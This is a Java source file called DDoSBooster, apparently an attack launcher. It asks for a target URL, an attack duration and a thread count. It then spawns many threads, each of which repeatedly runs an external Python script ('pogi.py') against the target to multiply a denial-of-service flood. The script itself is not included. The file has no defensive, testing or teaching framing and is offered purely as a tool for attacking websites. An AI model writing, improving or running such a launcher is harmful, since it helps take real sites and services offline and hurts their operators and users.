import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class DDoSBooster {
    private static final String PYTHON_SCRIPT = "python pogi.py";

    public static void main(String[] args) {
        // Input from user
        String targetUrl = getUserInput("Enter the target URL (e.g., http://example.com): ");
        int duration = Integer.parseInt(getUserInput("Enter attack duration in seconds: "));
        int numThreads = Integer.parseInt(getUserInput("Enter number of threads: "));

        // Start the Python script
        for (int i = 0; i < numThreads; i++) {
            new Thread(new ScriptRunner(targetUrl, duration, numThreads)).start();
        }
    }

    static class ScriptRunner implements Runnable {
        private String targetUrl;
        private int duration;
        private int numThreads;

        public ScriptRunner(String targetUrl, int duration, int numThreads) {
            this.targetUrl = targetUrl;
            this.duration = duration;
            this.numThreads = numThreads;
        }

        @Override
        public void run() {
            try {
                long startTime = System.currentTimeMillis();
                long endTime = startTime + duration * 1000; // Convert duration to milliseconds

                while (System.currentTimeMillis() < endTime) {
                    Process process = Runtime.getRuntime().exec(PYTHON_SCRIPT + " " + targetUrl + " " + numThreads + " " + duration);
                    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));

                    String line;
                    while ((line = reader.readLine()) != null) {
                        System.out.println(line);
                    }

                    process.waitFor();
                }
            } catch (IOException | InterruptedException e) {
                e.printStackTrace();
            }
        }
    }

    // Helper method to get user input
    private static String getUserInput(String prompt) {
        System.out.print(prompt);
        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));
        try {
            return reader.readLine();
        } catch (IOException e) {
            e.printStackTrace();
            return "";
        }
    }
}
